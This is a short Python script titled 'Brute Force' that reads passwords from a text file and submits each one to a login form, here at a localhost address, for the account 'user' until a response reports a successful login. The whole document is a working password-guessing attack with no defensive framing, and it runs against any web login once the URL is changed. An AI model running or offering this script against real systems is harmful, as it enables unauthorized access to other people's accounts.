# Brute Force
import requests

url = 'http://127.0.0.1:80/login'
file = open("passwords.txt", "r")
passwords = (file.read()).split('\n')

for i in range(len(passwords)):
    try:
        r = requests.post(url, data={"username": "user", "password": passwords[i]})
        r.raise_for_status()
        print(r.text)

        if "user is logged in!" in r.text:
            print(r.text)
            break
    except Exception as e:
        print(e)

